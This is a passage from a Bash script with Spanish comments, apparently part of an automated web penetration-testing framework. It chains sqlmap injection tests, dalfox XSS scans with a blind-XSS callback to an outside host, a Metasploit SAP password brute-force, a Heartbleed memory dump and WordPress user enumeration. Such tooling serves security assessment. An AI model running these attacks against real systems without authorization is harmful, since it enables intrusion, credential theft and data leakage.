			mkdir -p webClone/$host 2>/dev/null
			mkdir -p archivos/$host 2>/dev/null
			touch webClone/$host/checksumsEscaneados.txt	
			echo -e "\t[+] Navegacion forzada en host: $proto_http://$host:$port"									
									
			#Borrar lineas que cambian en cada peticion						
			removeLinks.py logs/enumeracion/"$host"_"$port"_webData.txt | egrep -vi 'date|token|hidden' > webClone/$host/"$proto_http"-"$host"-"$port".html
						
			if [[ ! -f webClone/$host/"$proto_http"-"$host"-"$port".html ]];then
				echo "no disponible" > webClone/$host/"$proto_http"-"$host"-"$port".html 
			fi

			checksumline=`md5sum webClone/$host/"$proto_http"-"$host"-"$port".html` 							
			md5=`echo $checksumline | awk {'print $1'}` 													
			egrep -iq $md5 webClone/$host/checksumsEscaneados.txt
			noEscaneado=$?

			if [[ $noEscaneado -eq 0 ]];then 
				echo -n "~sameHOST" >> .enumeracion/"$host"_"$port"_webData.txt
				sed -i ':a;N;$!ba;s/\n//g' .enumeracion/"$host"_"$port"_webData.txt #borrar salto de linea
			fi

			egrep -iq "no Route matched with those values" webClone/$host/"$proto_http"-"$host"-"$port".html
			greprc=$?
			if [[ $greprc -eq 0  ]];then 
				noEscaneado=1
			fi	
			
			egrep -qi "Dominio identificado|301 Moved|302 Found|500 Proxy Error|HTTPSredirect|400 Bad Request|Document Moved|Index of|timed out|Connection refused|Connection refused" .enumeracion/"$host"_"$port"_webData.txt
			hostOK=$?
			
			# 1= no coincide (no redirecciona a otro dominio o es error de proxy)							
			if [ "$VERBOSE" == 's' ]; then  echo -e "\tnoEscaneado $noEscaneado hostOK $hostOK "; fi
			
			if [[ $hostOK -eq 1 &&  $noEscaneado -eq 1 ]];then  # El sitio no fue escaneado antes/no redirecciona a otro dominio.
				echo $checksumline >> webClone/$host/checksumsEscaneados.txt	

				#######  If not firewall/IoT ######
				egrep -qi "Fortinet|Cisco|RouterOS|Juniper" .enumeracion/"$host"_"$port"_webData.txt
				greprc=$?				
				if [[ $greprc -eq 1  ]];then # Si no coincide								
					########### check methods ###	
					waitWeb 2.5	
					echo -e "\t[+] HTTP methods ($proto_http://$host:$port) "			
					httpmethods.py -k -L -t 5 $proto_http://$host:$port > logs/enumeracion/"$host"_"$port"_httpmethods.txt  2>/dev/null &

					if [[ "$MODE" == "total" ]]; then 

						# Headers seguros
						echo -e "\t[+] Revisar headers seguros ($proto_http://$host:$port) "
						shcheck.py -d --colours=none $url $proto_http://$host:$port > logs/vulnerabilidades/"$host"_"$port"_headerSegurosFaltantes.txt  2>/dev/null
        				grep 'Header seguro faltante' logs/vulnerabilidades/"$host"_"$port"_headerSegurosFaltantes.txt | egrep 'X-Content-Type|Strict-Transport|Referrer-Policy|X-Frame-Options' | sed 's/Header seguro faltante://g' > .vulnerabilidades/"$host"_"$port"_headerSegurosFaltantes.txt
						
						#source resource integrity
						echo -e "\t[+] source resource integrity check ($proto_http://$host:$port) "
						sri-check $proto_http://$host:$port  > logs/vulnerabilidades/"$host"_"$port"_sri.txt 2>/dev/null
						grep -i '<script' logs/vulnerabilidades/"$host"_"$port"_sri.txt > .vulnerabilidades/"$host"_"$port"_sri.txt 2>/dev/null

						# allow http
						echo -e "\t[+] allow http check ($proto_http://$host:$port)  " 
						allow-http -target=$host > logs/vulnerabilidades/"$host"_"$port"_allow-http.txt 
						egrep -iq "vulnerable" logs/vulnerabilidades/"$host"_"$port"_allow-http.txt
						greprc=$?
						if [[ $greprc -eq 0 ]] ; then	
							cp logs/vulnerabilidades/"$host"_"$port"_allow-http.txt .vulnerabilidades/"$host"_"$port"_allow-http.txt
						fi

						# _blank targets with no "rel nofollow no referrer"
						echo -e "\t[+] _blank targets check ($proto_http://$host:$port)  " 
						check_blank_target $proto_http://$host:$port > logs/vulnerabilidades/"$host"_"$port"_check-blank-target.txt 
						grep -iv error logs/vulnerabilidades/"$host"_"$port"_check-blank-target.txt > .vulnerabilidades/"$host"_"$port"_check-blank-target.txt 

						echo -e "\t[+] multiviews check ($proto_http://$host:$port)  " 
						multiviews -url=$proto_http://$host:$port/ > logs/vulnerabilidades/"$host"_"$port"_apache-multiviews.txt 
						grep vulnerable logs/vulnerabilidades/"$host"_"$port"_apache-multiviews.txt > .vulnerabilidades/"$host"_"$port"_apache-multiviews.txt 

						egrep -i "drupal|wordpress|joomla|moodle" .enumeracion/"$host"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|Always200-OK|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs"
						greprc=$?						
						if [[  "$EXTRATEST" == "oscp" && $greprc -eq 1 ]]; then	
							
							##########################################
							echo -e "\t[+] Crawling ($proto_http://$host:$port )"							
							katana -u $proto_http://$host:$port -no-scope -output logs/enumeracion/"$host"_"$port"_webCrawled2.txt >/dev/null 2>/dev/null
							sort logs/enumeracion/"$host"_"$port"_webCrawled2.txt | uniq > logs/enumeracion/"$host"_"$port"_webCrawled.txt
							grep $DOMINIO logs/enumeracion/"$host"_"$port"_webCrawled.txt | egrep -v 'google|youtube' | sort | uniq > .enumeracion/"$host"_"$port"_webCrawled.txt
							grep -iv $DOMINIO logs/enumeracion/"$host"_"$port"_webCrawled.txt | egrep -v 'google|youtube' | sort | uniq  > .enumeracion/"$host"_"$port"_websRelated.txt
							echo ""											
							 
							grep --color=never "\?" .enumeracion/*_webCrawled.txt | sort | uniq >> logs/enumeracion/parametrosGET2.txt
							grep "$host" logs/enumeracion/parametrosGET2.txt | egrep -iv '\.css|\.js|\.eot|\.svg|\.ttf|\.woff2' |sort | uniq  >> logs/enumeracion/"$host"_parametrosGET_uniq.txt
							
							##### Eliminar URL repetidas que solo varian en los parametros
							current_uri=""
							while IFS= read -r url
							do							
								uri=`echo $url | cut -f1 -d"?"`
								param=`echo $line | cut -f2 -d"?"`
									
								if [ "$current_uri" != "$uri" ];
								then
									echo  "$url" >> logs/enumeracion/"$host"_parametrosGET_uniq_final.txt
									current_uri=$uri
								fi	
							done < logs/enumeracion/"$host"_parametrosGET_uniq.txt
							
							
							########### XSS / SQLi ####
							i=1
							for url in `cat logs/enumeracion/"$host"_parametrosGET_uniq_final.txt 2>/dev/null`; do
								echo -e "$OKBLUE+ -- --=############ Revisando $url (SQLi/XSS) #########$RESET" 
																
								echo -e "$OKBLUE+ -- --=############ Probando SQL inyection. #########$RESET" 
								echo  "$url" | tee -a logs/vulnerabilidades/"$host"_"web$i"_sqlmap.txt
								sqlmap -u "$url" --batch --tamper=space2comment --threads 5 | tee -a logs/vulnerabilidades/"$host"_"web$i"_sqlmap.txt
								sqlmap -u "$url" --batch  --technique=B --risk=3  --threads 5 | tee -a logs/vulnerabilidades/"$host"_"web$i"_sqlmapBlind.txt
								
								#  Buscar SQLi
								egrep -iq "is vulnerable" logs/vulnerabilidades/"$host"_"web$i"_sqlmap.txt
								greprc=$?
								if [[ $greprc -eq 0 ]] ; then			
									echo -e "\t$OKRED[!] Inyeccion SQL detectada \n $RESET"
									echo "sqlmap -u \"$url\" --batch " > .vulnerabilidades/"$host"_"web$i"_sqlmap.txt
								fi
								
								#  Buscar SQLi blind
								egrep -iq "is vulnerable" logs/vulnerabilidades/"$host"_"web$i"_sqlmapBlind.txt
								greprc=$?
								if [[ $greprc -eq 0 ]] ; then			
									echo -e "\t$OKRED[!] Inyeccion SQL detectada \n $RESET"
									echo "sqlmap -u \"$url\" --batch  --technique=B --risk=3" > .vulnerabilidades/"$host"_"web$i"_sqlmapBlind.txt
								fi		
								
								#  Buscar XSS
								dalfox -b hahwul.xss.ht url $url | tee -a logs/vulnerabilidades/"$host"_"web$i"_xss.txt
								#https://z0id.xss.ht/
								
								
								egrep -iq "Triggered XSS Payload" logs/vulnerabilidades/"$host"_"web$i"_xss.txt
								greprc=$?
								if [[ $greprc -eq 0 ]] ; then			
									echo -e "\t$OKRED[!] XSS detectada \n $RESET"
									echo "url $url" >  .vulnerabilidades/"$host"_"web$i"_xss.txt
									egrep -ia "Triggered XSS Payload" logs/vulnerabilidades/"$host"_"web$i"_xss.txt >> .vulnerabilidades/"$host"_"web$i"_xss.txt
								fi		

								i=$(( i + 1 ))								
								
							done
							#####################
						fi #oscp
					fi					
				fi
				######													
				
				if [[ "$INTERNET" == "s" ]] && [[ "$MODE" == "total" ]]; then 
					echo -e "\t\t[+] identificar si el host esta protegido por un WAF "
					wafw00f $proto_http://$host:$port > logs/enumeracion/"$host"_"$port"_wafw00f.txt &							
				fi	
				
				egrep -i "httpfileserver" .enumeracion/"$host"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|Always200-OK|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs" # solo el segundo egrep poner "-q"
				greprc=$?
				if [[ $greprc -eq 0  ]];then #															
					echo "httpfileserver Vulnerable: https://github.com/Muhammd/ProFTPD-1.3.3a " > .vulnerabilidades/"$ip"_"$port"_ProFTPD-RCE.txt
				fi

				###  if the server is apache ######
				egrep -i "apache|nginx|kong" .enumeracion/"$host"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|Always200-OK|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs" # solo el segundo egrep poner "-q"
				greprc=$?
				if [[ $greprc -eq 0  ]];then # si el banner es Apache y no se enumero antes
					enumeracionApache "$proto_http" $host $port
				fi						
				####################################	

				#######  if the server is SharePoint ######
				grep -i SharePoint .enumeracion/"$host"_"$port"_webData.txt | egrep -qiv "302 Found|cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|Always200-OK|Nextcloud|Open Source Routing Machine|ownCloud|GoAhead-Webs"  # no redirecciona
				greprc=$?
				if [[ $greprc -eq 0  ]];then # si el banner es SharePoint 																															
					enumeracionSharePoint "$proto_http" $host $port								   
				fi										
				####################################
				
				#######  if the server is IIS ######
				grep -i IIS .enumeracion/"$host"_"$port"_webData.txt | egrep -qiv "302 Found|AngularJS|BladeSystem|cisco|Cloudflare|Coyote|Express|GitLab|GoAhead-Webs|Nextcloud|Always200-OK|Open Source Routing Machine|oracle|Outlook|owa|ownCloud|Pfsense|Roundcube|Router|SharePoint|Taiga|Zentyal|Zimbra"  # no redirecciona
				greprc=$?
				if [[ $greprc -eq 0  ]];then # si el banner es IIS y no se enumero antes															
					enumeracionIIS "$proto_http" $host $port								   
				fi							
				####################################	


				#######  if the server is tomcat ######
				egrep -i "GlassFish|Coyote|Tomcat|Resin|JBoss|WildFly" .enumeracion/"$host"_"$port"_webData.txt | egrep -qiv "302 Found" 
				greprc=$?				
				if [[ $greprc -eq 0  ]];then # si el banner es Java y no se enumero antes								
					enumeracionTomcat "$proto_http" $host $port																							
				fi									
				####################################

				#######  if the server is SAP ######
				egrep -i "SAP NetWeaver" .enumeracion/"$host"_"$port"_webData.txt | egrep -qiv "302 Found" 
				greprc=$?				
				if [[ $greprc -eq 0  ]];then # si el banner es Java y no se enumero antes								
					enumeracionSAP "$proto_http" $host $port
					echo -e "\t\t[+] http-sap-netweaver-leak"
					$proxychains nmap -n -Pn -sT -p $port --script http-sap-netweaver-leak  $ip > logs/vulnerabilidades/"$ip"_"$port"_sap-netweaver-leak.txt

					echo -e "\t\t[+] Test default passwords" 
					$proxychains msfconsole -x "use auxiliary/scanner/sap/sap_soap_rfc_brute_login;set RHOSTS $ip;set RPORT $port;exploit;exit" > logs/vulnerabilidades/"$ip"_"$port"_passwordDefecto.txt 2>/dev/null &	
					#auxiliary/scanner/sap/sap_soap_rfc_read_table 
					#set FIELDS MANDT, BNAME, UFLAG, BCODE, PASSCODE, PWDSALTEDHASH
				fi									
				####################################
					
				enumeracionCMS "$proto_http" $host $port

				if [ $proto_http == "https" ]; then
					testSSL "$proto_http" $host $port	
				fi

				# if not technology not reconigzed	
				egrep -qi "unsafe legacy renegotiation disabled" .enumeracion/"$host"_"$port"_webData.txt  2>/dev/null 
				greprc=$?
				if [[ $greprc -eq 0 ]] ; then
					cp .enumeracion/"$host"_80_webData.txt .enumeracion/"$host"_"$port"_webData.txt
				fi

				serverType=`cat .enumeracion/"$host"_"$port"_webData.txt | cut -d "~" -f2`
				echo -e "\t\t[+] serverType $serverType"
				if [  -z "$serverType" ]; then
					enumeracionDefecto "$proto_http" $host $port
				fi														

				#######  if the server is IoT ######
				enumeracionIOT	$proto_http $host $port

				#echo -e "\t\t[+] cloneSite ($proto_http $host $port) PROXYCHAINS $PROXYCHAINS MODE $MODE"
				######### clone #####
				if [[ "$PROXYCHAINS" == "n" ]] && [[ "$MODE" == "total" ]]; then 
					cloneSite $proto_http $host $port	
				fi  					
				####################################	
				echo -e "\n"
			else
				echo -e "\t\t[+] Redirección, error de proxy detectado o sitio ya escaneado \n"	
			fi														
		fi #hosting
	done # subdominios 			  			
done #for navegacino forzada

waitFinish

if [ "$VERBOSE" == 's' ]; then  echo " IP_LIST_FILE $IP_LIST_FILE"; fi 	


####### PARSE ########

##########  Filtrar los directorios que respondieron 200 OK (llevarlos a .enumeracion) ################
echo -e "$OKBLUE [i] Filtrar los directorios descubiertos que respondieron 200 OK (llevarlos a .enumeracion) $RESET"	    
touch logs/enumeracion/canary_webdirectorios.txt # se necesita al menos 2 archivos *_webdirectorios.txt
egrep --color=never "^200|^401" logs/enumeracion/*webdirectorios.txt 2>/dev/null| while read -r line ; do	
	#echo -e  "$OKRED[!] Listado de directorio detectado $RESET"		
	archivo_origen=`echo $line | cut -d ':' -f1`
	contenido=`echo $line | cut -d ':' -f2-6`    
	#echo "archivo_origen $archivo_origen"
	archivo_destino=$archivo_origen       
	archivo_destino=${archivo_destino/logs\/enumeracion/.enumeracion}   	    
	#200	http://192.168.50.154:80/img/ (Listado directorio activo)	 TRACE
	#echo "contenido $contenido"
	echo $contenido >> $archivo_destino        
done

for line in $(cat $TARGETS); do
	ip=`echo $line | cut -f1 -d":"`
	port=`echo $line | cut -f2 -d":"`		
	proto_http=`echo $line | cut -f3 -d":"`							
	if [ -z $DOMINIO ] ; then 
		lista_hosts=`grep --color=never $ip $IP_LIST_FILE  | egrep 'DOMINIO|subdomain|vhost'| cut -d "," -f2`
		if [ -z "$lista_hosts" ] ; then 
				lista_hosts=$ip
		else
				lista_hosts=`echo -e "$lista_hosts\n$ip"|uniq`
		fi
	else
		lista_hosts=$ip
	fi

	

	for host in $lista_hosts; do
		echo -e "Parse $host:$port"
		cp logs/enumeracion/"$host"_"$port"_joomla-version.txt .enumeracion/"$host"_"$port"_joomla-version.txt 2>/dev/null
		grep -i 'valid credentials' logs/vulnerabilidades/"$host"_"$port"_passwordDefecto.txt 2>/dev/null | sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g" > .vulnerabilidades/"$ip"_"$port"_passwordDefecto.txt
		egrep --color=never "^200|^401" logs/vulnerabilidades/"$host"_"$port"_backupweb.txt >> .vulnerabilidades/"$host"_"$port"_backupweb.txt 2>/dev/null
		egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_webarchivos.txt  >> .enumeracion/"$host"_"$port"_webarchivos.txt  2>/dev/null		
		egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_SharePoint.txt >> .enumeracion/"$host"_"$port"_SharePoint.txt 2>/dev/null				
		egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_webadmin.txt > .enumeracion/"$host"_"$port"_webadmin.txt  2>/dev/null		
		egrep --color=never "^200|^401|^403" logs/enumeracion/"$host"_"$port"_webdirectorios.txt	> .enumeracion/"$host"_"$port"_webdirectorios.txt 2>/dev/null
		egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_archivosSAP.txt > .enumeracion/"$host"_"$port"_archivosSAP.txt 2>/dev/null		

		egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_webserver.txt > .enumeracion/"$host"_"$port"_webarchivos.txt  2>/dev/null		
		egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_webservices.txt > .enumeracion/"$host"_"$port"_webarchivos.txt 2>/dev/null		
		egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_asp-files.txt > .enumeracion/"$host"_"$port"_webarchivos.txt 2>/dev/null
		egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_graphQL.txt > .enumeracion/"$host"_"$port"_webarchivos.txt 2>/dev/null		     
		egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_php-files.txt > .enumeracion/"$host"_"$port"_webarchivos.txt 2>/dev/null
		egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_archivosTomcat.txt > .enumeracion/"$host"_"$port"_webarchivos.txt 2>/dev/null
		egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_aspx-files.txt > .enumeracion/"$host"_"$port"_aspx-files.txt 2>/dev/null

		egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_archivosCGI.txt 2>/dev/null | awk '{print $2}' >> servicios/cgi.txt
		egrep --color=never "^200|^401" logs/enumeracion/"$host"_"$port"_archivosCGI.txt > .enumeracion/"$host"_"$port"_archivosCGI.txt 2>/dev/null 		
		egrep --color=never "^200|^401" logs/vulnerabilidades/"$host"_"$port"_archivosDefecto.txt > .vulnerabilidades/"$host"_"$port"_archivosDefecto.txt 2>/dev/null 		
		egrep --color=never "^200|^401" logs/vulnerabilidades/"$host"_"$port"_archivosPeligrosos.txt  >> .vulnerabilidades/"$host"_"$port"_archivosPeligrosos.txt 2>/dev/null
		egrep --color=never "^200|^401" logs/vulnerabilidades/"$host"_"$port"_webshell.txt >> .vulnerabilidades/"$host"_"$port"_webshell.txt 2>/dev/null		
		egrep --color=never "^200|^401" logs/vulnerabilidades/"$host"_"$port"_divulgacionInformacion.txt > .vulnerabilidades/"$host"_"$port"_divulgacionInformacion.txt 2>/dev/null		
		grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_HTTPsys.txt 2>/dev/null | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE|NT_STATUS_UNKNOWN|http-server-header|did not respond with any data|http-server-header" > .vulnerabilidades/"$host"_"$port"_HTTPsys.txt
		grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_IISwebdavVulnerable.txt 2>/dev/null | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE|NT_STATUS_UNKNOWN|http-server-header|did not respond with any data|http-server-header" > .vulnerabilidades/"$host"_"$port"_IISwebdavVulnerable.txt
		grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_nmapHTTPvuln.txt 2>/dev/null |  egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE|NT_STATUS_UNKNOWN|http-server-header|did not respond with any data|http-server-header" > .vulnerabilidades/"$host"_"$port"_nmapHTTPvuln.txt
		grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_sap-netweaver-leak.txt 2>/dev/null |  egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE|NT_STATUS_UNKNOWN|http-server-header|did not respond with any data|http-server-header" > .vulnerabilidades/"$host"_"$port"_sap-netweaver-leak.txt
		grep --color=never "401" logs/enumeracion/"$host"_"$port"_certfnsh.txt > .enumeracion/"$host"_"$port"_certfnsh.txt

		grep --color=never 'Grade cap ' -m1 -b1 -A20 logs/vulnerabilidades/"$host"_"$port"_testSSL.txt > logs/vulnerabilidades/"$host"_"$port"_confTLS.txt 2>/dev/null
		grep --color=never 'Grade cap ' -m1 -b1 -A20 logs/vulnerabilidades/"$host"_"$port"_testSSL.txt > logs/vulnerabilidades/"$host"_"$port"_vulTLS.txt 2>/dev/null		
		grep -i --color=never "incorrecta" logs/vulnerabilidades/"$host"_"$port"_confTLS.txt | egrep -iv "Vulnerable a" | cut -d '.' -f2-4 > .vulnerabilidades/"$host"_"$port"_confTLS.txt 2>/dev/null
		#grep -i --color=never "ofrecido" logs/vulnerabilidades/"$host"_"$port"_vulTLS.txt | cut -d '.' -f2-4 > .vulnerabilidades/"$host"_"$port"_vulTLS.txt 2>/dev/null
		grep -i --color=never "Certificado expirado" logs/vulnerabilidades/"$host"_"$port"_vulTLS.txt | cut -d '.' -f2-4 >> .vulnerabilidades/"$host"_"$port"_vulTLS.txt 2>/dev/null
		grep -i --color=never "VULNERABLE" logs/vulnerabilidades/"$host"_"$port"_vulTLS.txt | cut -d '.' -f2-4 >> .vulnerabilidades/"$host"_"$port"_vulTLS.txt 2>/dev/null

		egrep --color=never "200|vulnerable" logs/vulnerabilidades/"$host"_"$port"_sap-scan.txt  >> .vulnerabilidades/"$host"_"$port"_sap-scan.txt 2>/dev/null
		egrep --color=never "Registro habilitado" logs/vulnerabilidades/"$host"_"$port"_registroHabilitado.txt  >> .vulnerabilidades/"$host"_"$port"_registroHabilitado.txt	2>/dev/null
		egrep --color=never "root" logs/vulnerabilidades/"$host"_"$port"_citrixVul.txt 2>/dev/null | grep -vi 'error' > .vulnerabilidades/"$host"_"$port"_citrixVul.txt 		
		egrep --color=never "VULNERABLE" logs/vulnerabilidades/"$host"_"$port"_CVE-2020-0688.txt > .vulnerabilidades/"$host"_"$port"_CVE-2020-0688.txt 2>/dev/null
		egrep --color=never ":x:" logs/vulnerabilidades/"$host"_"$port"_apacheTraversal.txt  > .vulnerabilidades/"$host"_"$port"_apacheTraversal.txt 2>/dev/null
		egrep --color=never ":x:" logs/vulnerabilidades/"$host"_"$port"_bigIPVul.txt > .vulnerabilidades/"$host"_"$port"_bigIPVul.txt 2>/dev/null
		egrep --color=never ":x:" logs/vulnerabilidades/"$host"_"$port"_pulseVul.txt > .vulnerabilidades/"$host"_"$port"_pulseVul.txt 2>/dev/null
		egrep -i "Apache Struts Vulnerable" logs/vulnerabilidades/"$host"_"$port"_apacheStruts.txt > .vulnerabilidades/"$host"_"$port"_apacheStruts.txt 2>/dev/null
		egrep '\[+\]' logs/enumeracion/"$host"_"$port"_shortname.txt 2>/dev/null |  sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g" >> .enumeracion/"$host"_"$port"_shortname.txt
		egrep uid logs/vulnerabilidades/"$host"_"$port"_cve-2021-41773.txt > .vulnerabilidades/"$host"_"$port"_cve-2021-41773.txt 2>/dev/null
		egrep 'WEB-INF' logs/vulnerabilidades/"$host"_"$port"_CGIServlet.txt > .vulnerabilidades/"$host"_"$port"_CGIServlet.txt 2>/dev/null
		egrep '\[info\]' logs/vulnerabilidades/"$host"_"$port"_proxynoshell.txt > .vulnerabilidades/"$host"_"$port"_proxynoshell.txt 2>/dev/null
		egrep '\[info\]' logs/vulnerabilidades/"$host"_"$port"_proxyshell.txt > .vulnerabilidades/"$host"_"$port"_proxyshell.txt 2>/dev/null
		egrep --color=never "INTERNAL_PASSWORD_ENABLED" logs/vulnerabilidades/"$host"_"$port"_cve2020-3452.txt > .vulnerabilidades/"$host"_"$port"_cve2020-3452.txt 2>/dev/null

		egrep '\[+\]' logs/vulnerabilidades/"$host"_"$port"_wordpressGhost.txt 2>/dev/null |  sed -r "s/\x1B\[(([0-9]+)(;[0-9]+)*)?[m,K,H,f,J]//g" >> .vulnerabilidades/"$host"_"$port"_wordpressGhost.txt 2>/dev/null
		grep -i 'vulnerable' logs/vulnerabilidades/"$host"_"$port"_wordpress-CVE-2022-21661.txt > .vulnerabilidades/"$host"_"$port"_wordpress-CVE-2022-21661.txt 2>/dev/null
		grep -i 'vulnerable' logs/vulnerabilidades/"$host"_"$port"_wordpress-plugins.txt > .vulnerabilidades/"$host"_"$port"_wordpress-plugins.txt 2>/dev/null
		grep -i 'demo.sayHello' logs/vulnerabilidades/"$host"_"$port"_xml-rpc-habilitado.txt > .vulnerabilidades/"$host"_"$port"_xml-rpc-habilitado.txt 2>/dev/null
		grep -i 'incorrect' logs/vulnerabilidades/"$host"_"$port"_xml-rpc-login.txt > .vulnerabilidades/"$host"_"$port"_xml-rpc-login.txt 2>/dev/null

		grep --color=never "|" logs/enumeracion/"$host"_"$port"_hadoopNamenode.txt  2>/dev/null | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE|NT_STATUS_UNKNOWN|http-server-header|did not respond with any data|http-server-header" > .enumeracion/"$host"_"$port"_hadoopNamenode.txt 

		#nuclei
		egrep --color=never '\[medium\]|\[high\]|\[critical\]' logs/vulnerabilidades/"$host"_"$port"_apache-nuclei.txt > .vulnerabilidades/"$host"_"$port"_apache-nuclei.txt 2>/dev/null
		egrep --color=never '\[medium\]|\[high\]|\[critical\]' logs/vulnerabilidades/"$host"_"$port"_tomcat-nuclei.txt > .vulnerabilidades/"$host"_"$port"_tomcat-nuclei.txt 2>/dev/null
		egrep --color=never '\[medium\]|\[high\]|\[critical\]' logs/vulnerabilidades/"$host"_"$port"_joomla-nuclei.txt > .vulnerabilidades/"$host"_"$port"_joomla-nuclei.txt 2>/dev/null
		egrep --color=never '\[medium\]|\[high\]|\[critical\]' logs/vulnerabilidades/"$host"_"$port"_wordpress-nuclei.txt > .vulnerabilidades/"$host"_"$port"_wordpress-nuclei.txt 2>/dev/null
		egrep --color=never '\[medium\]|\[high\]|\[critical\]' logs/vulnerabilidades/"$host"_"$port"_drupal-nuclei.txt > .vulnerabilidades/"$host"_"$port"_drupal-nuclei.txt 2>/dev/null

		cat logs/vulnerabilidades/"$host"_"$port"_droopescan.txt > .enumeracion/"$host"_"$port"_droopescan.txt	2>/dev/null 		
		cat logs/vulnerabilidades/"$host"_"$port"_wpUsers.json 2>/dev/null  | wpscan-parser.py   2>/dev/null | grep -iv 'Rss Generator' | awk {'print $2'} > logs/vulnerabilidades/"$host"_"$port"_wpUsers.txt 2>/dev/null
		
		for username in `cat logs/vulnerabilidades/"$host"_"$port"_wpUsers.txt`
		do						
			if [ "$VERBOSE" == 's' ]; then echo "probando si $username es valido"; fi 
			respuesta=`validate-wordpress-user -url $proto_http://$host:$port/ -username $username`			
			sleep 4
			if [[ ( ${respuesta} == *"no existe"* && ${username} == *"-"* && ! -z $DOMINIO )]];then 
				username="${username//-/.}" # reemplazar - con .
				username="$username@$DOMINIO"
				username="${username//www./}"
				if [ "$VERBOSE" == 's' ]; then echo "probando si $username es valido"; fi 
				respuesta=`validate-wordpress-user -url $proto_http://$host:$port/ -username $username`
				sleep 4
			fi
#			echo "respuesta $respuesta"
			if [[ ${respuesta} == *"usuario valido"*  ]] ; then
				echo $username >> .vulnerabilidades/"$host"_"$port"_wpUsers.txt
			fi
		done
 		
		cat logs/vulnerabilidades/"$host"_"$port"_wpUsers.json 2>/dev/null | jq -r '.version.number' > .enumeracion/"$host"_"$port"_wp-version.txt 2>/dev/null 

		
		#heartbleed
		egrep -qi "VULNERABLE" logs/vulnerabilidades/"$host"_"$port"_heartbleed.txt 2>/dev/null 
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then						
			echo -e "\t\t$OKRED[!] Vulnerable a heartbleed \n $RESET"
			grep --color=never "|" logs/vulnerabilidades/"$host"_"$port"_heartbleed.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE|NT_STATUS_UNKNOWN|http-server-header|did not respond with any data|http-server-header" > .vulnerabilidades/"$host"_"$port"_heartbleed.txt				
			$proxychains heartbleed.py $host -p $port 2>/dev/null | head -100 | sed -e's/%\([0-9A-F][0-9A-F]\)/\\\\\x\1/g' > .vulnerabilidades/"$host"_"$port"_heartbleedRAM.txt					
			$proxychains heartbleed.sh $host $port &
		fi	

		#Redirect con contenido
		egrep -qi "posiblemente vulnerable" logs/enumeracion/"$hosta"_"$port"_httpmethods.txt 2>/dev/null
		greprc=$?
		if [[ $greprc -eq 0  ]];then
			if [ "$VERBOSE" == 's' ]; then  echo "Redireccion con contenido DETECTADO $proto_http://$host:$port "; fi				
			curl --max-time 10 -k $proto_http://$host:$port > .vulnerabilidades/"$host"_"$port"_redirectContent.txt &
		fi							

		#WebDAV			
		egrep -i "OK" logs/enumeracion/"$host"_"$port"_httpmethods.txt 2>/dev/null| grep -iq 'PROPFIND'
		greprc=$?
		if [[ $greprc -eq 0  ]];then
			if [[ $VERBOSE -eq 's'  ]];then echo "Metodo PROPFIND DETECTADO"; fi
			if [[ "$port" != "80" && "$port" != '443' ]];then
				davtest -url $proto_http://$host:$port >> logs/vulnerabilidades/"$host"_"$port"_webdav.txt 2>>logs/vulnerabilidades/"$host"_"$port"_webdav.txt &
			else
				davtest -url $proto_http://$host >> logs/vulnerabilidades/"$host"_"$port"_webdav.txt 2>>logs/vulnerabilidades/"$host"_"$port"_webdav.txt &
			fi
			#exploit cadaver

			grep -i IIS .enumeracion/"$host"_"$port"_webData.txt | egrep -qiv "302 Found|AngularJS|BladeSystem|cisco|Cloudflare|Coyote|Express|GitLab|GoAhead-Webs|Nextcloud|Always200-OK|Open Source Routing Machine|oracle|Outlook|owa|ownCloud|Pfsense|Roundcube|Router|SharePoint|Taiga|Zentyal|Zimbra"  # no redirecciona
			greprc=$?
